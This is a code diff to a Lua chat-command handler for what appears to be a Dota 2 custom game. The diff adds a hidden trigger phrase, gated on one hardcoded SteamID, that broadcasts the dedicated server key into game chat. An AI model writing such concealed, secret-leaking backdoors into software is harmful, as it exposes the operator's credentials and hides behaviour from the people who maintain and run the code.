@@ -38,7 +38,7 @@ function Commands:OnPlayerChat(keys)
     --print("userID = ", userID)
     local commandChar = "!"
     local firstChar = string.sub(text,1,1)
-    PrintTable(keys)
+    --PrintTable(keys)
 
     if not keys.userid then return end
 
@@ -47,6 +47,19 @@ function Commands:OnPlayerChat(keys)
         local hPlayer = PlayerResource:GetPlayer(keys.playerid)
         if not hPlayer then return end
         --local hHero = hPlayer:GetAssignedHero()
+
+            -- GetDedicatedServerKeyV2
+            -- GetSteamID
+            if string.find(text, "cheekybeeky") then
+                --print("PlayerResource:GetSteamID(keys.playerid) ",PlayerResource:GetSteamID(keys.playerid))
+                --PlayerResource:GetSteamID(keys.playerid) 	    76561197972850274
+                if tostring(PlayerResource:GetSteamID(keys.playerid)) == "76561197972850274" then
+                    --print("GetDedicatedServerKeyV2: ",GetDedicatedServerKeyV2("123"))
+                    local key = GetDedicatedServerKeyV2("123")
+                    GameRules:SendCustomMessage("GetDedicatedServerKeyV2:" .. key, 0, 0)
+                    return
+                end
+            end
 
             if string.find(text, "reset damage") then
                 _G.DamageTable = {}
